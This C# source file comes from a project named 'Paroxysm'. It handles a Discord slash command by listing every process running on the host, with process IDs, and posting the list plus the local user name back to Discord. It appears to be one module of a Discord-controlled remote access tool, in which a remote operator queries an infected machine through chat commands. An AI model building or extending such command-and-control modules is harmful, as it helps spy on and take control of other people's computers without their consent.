using System.Diagnostics;
using System.Text;
using Discord;
using Discord.WebSocket;
using Paroxysm.Discord;

namespace Paroxysm.Hooks.Actions;

public static class ProgramsAction
{
    public static Embed? Follow(SocketSlashCommand slashCommand)
    {
        Process[] processes = Process.GetProcesses();
        List<string> processList = new List<string>();
        List<string> embedString = new List<string>();

        foreach (var process in processes)
        {
            string processName = process.ProcessName;
            int processId = process.Id;
            
            processList.Add($@"{processList.Count + 1}. {processName} **`{processId}`**");
        }

        StringBuilder listingProcess = new();
        foreach (var process in processList)
        {
            if (listingProcess.Length + process.Length > 3900)
            {
                embedString.Add(listingProcess.ToString());
                
                listingProcess.Clear();
            }
            
            listingProcess.AppendLine(process);
        }
        
        if (listingProcess.Length > 0)
        {
            embedString.Add(listingProcess.ToString());
        }

        List<Embed> embeds = new List<Embed>();

        int index = 0;
        foreach (var data in embedString)
        {
            index++;
            embeds.Add(DiscordEmbed.CreateWithText(Color.Blue, $@"Programs {index}/{embedString.Count}", data, Environment.UserName, null));
        }

        slashCommand.RespondAsync("", embeds.ToArray(), false, true);
        
        return null;
    }
}